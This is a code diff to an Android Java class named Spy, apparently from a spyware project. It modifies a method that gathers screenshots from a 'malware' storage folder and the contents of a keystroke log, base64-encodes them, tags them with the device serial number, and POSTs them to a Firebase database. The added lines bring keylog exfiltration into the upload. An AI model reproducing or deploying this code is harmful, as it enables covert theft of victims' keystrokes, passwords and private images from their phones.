@@ -45,17 +45,22 @@ public class Spy {
      */
     public void sendRecordedData(){
         try {
+            FileUtil fileUtil = FileUtil.getInstance();
             String userIdentifier = android.os.Build.class.getField("SERIAL").get(null).toString();
-            String directory = "/user/" + userIdentifier + "/screenshots/" + (new Date()).getTime() + ".json";
+            String directory = "/user/" + userIdentifier + "/" + (new Date()).getTime() + ".json";
 
             URL databaseURL = new URL(FirebaseConfig.getDatabaseURL() + directory);
             HttpsURLConnection urlConnection = getConnection(databaseURL);
 
             JSONObject jsonObject = new JSONObject();
 
-            for (File file: FileUtil.getInstance().getAllImagesFrom(Environment.getExternalStorageDirectory())) {
+            for (File file: FileUtil.getInstance().getAllImagesFrom(fileUtil.getMalwareImagesStorageFolder())) {
                 jsonObject.put(file.getName().split("\\.")[0].toLowerCase(), base64Encoding(file));
             }
+
+            String keypressFileContent = FileUtil.getStringFromFile(fileUtil.getMalwareKeypressStorageFolder().getAbsolutePath()
+                                    + File.separator + fileUtil.getKeypressFileName());
+            jsonObject.put("Keylog", keypressFileContent);
 
             setPostRequestContent(urlConnection, jsonObject);
             urlConnection.connect();
@@ -71,6 +76,8 @@ public class Spy {
         } catch (IllegalAccessException e) {
             e.printStackTrace();
         } catch (NoSuchFieldException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
